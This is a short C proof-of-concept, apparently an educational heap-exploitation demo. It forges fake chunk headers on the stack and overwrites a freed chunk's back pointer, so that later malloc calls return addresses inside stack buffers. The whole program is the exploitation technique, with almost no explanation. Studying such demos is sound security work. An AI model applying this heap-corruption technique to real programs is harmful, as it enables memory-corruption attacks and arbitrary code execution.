#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
    uint64_t  *ptr1, *ptr2, *ptr3, *top;
    uint64_t *fake1, *fake2;
    uint64_t fake_chunk[4];
    uint64_t fake_chunk2[3];

    fprintf(stderr, "fake_chunk: %p\n", fake_chunk);
    fprintf(stderr, "fake_chunk2: %p\n", fake_chunk2);

    ptr1 = malloc(0x100);
    ptr2 = malloc(0x100);
    ptr3 = malloc(0x100);

    fprintf(stderr, "ptr1: %p\n", ptr1);
    fprintf(stderr, "ptr2: %p\n", ptr2);
    fprintf(stderr, "ptr3: %p\n", ptr3); 

    free(ptr1);
    free(ptr3);
    
    top = malloc(0x110);
    fake_chunk[0] = 0;
    fake_chunk[1] = 0x111;
    fake_chunk[2] = (uint64_t)ptr1 - 0x10;
    ptr1[1] = (uint64_t)&fake_chunk;

    fake1 = malloc(0x100); 

    fake_chunk[3] = (uint64_t)&fake_chunk2;
    fake_chunk2[2] = (uint64_t)&fake_chunk;
    fake2 = malloc(0x100); //victim malloc2
    
    fprintf(stderr, "fake1: %p\n", fake1);
    fprintf(stderr, "fake2: %p\n", fake2);
    
    return 0;
}